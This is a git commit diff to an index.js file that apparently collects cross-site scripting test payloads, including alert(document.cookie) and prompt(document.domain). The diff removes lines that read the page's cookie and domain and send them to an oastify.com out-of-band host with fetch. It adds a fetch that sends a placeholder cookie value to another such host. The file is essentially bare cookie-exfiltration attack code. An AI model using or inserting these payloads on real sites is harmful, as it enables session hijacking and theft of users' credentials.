70c4dd73d2dc8beeb3aa166837026e202dad101c
avijit-maz <86185550+avijit-maz@users.noreply.github.com>
2024-09-24 14:38:47 +0530

    Testing outbound connectoin

--- index.js
+++ index.js
@@ -4,12 +4,8 @@ prompt("3. xss through prompt")
 alert(document.cookie)
 prompt(document.domain)
 
-const cookieValue = document.cookie;
-const url = `http://http://ytv34mbs8ktvvm4sqo3bw6oar1xrlg.oastify.com?cookie=${encodeURIComponent(cookieValue)}`;
+const cookieValue = "TestcookieValue";
+
+const url = `http://fraqiqv4hfz631dzya9ae5dkvb11pq.oastify.com?cookie=${cookieValue}`;
 
 fetch(url)
-
-const domainValue = document.domain;
-const urlDomain = `http://http://ytv34mbs8ktvvm4sqo3bw6oar1xrlg.oastify.com?cookie=${encodeURIComponent(domainValue)}`;
-
-fetch(urlDomain)
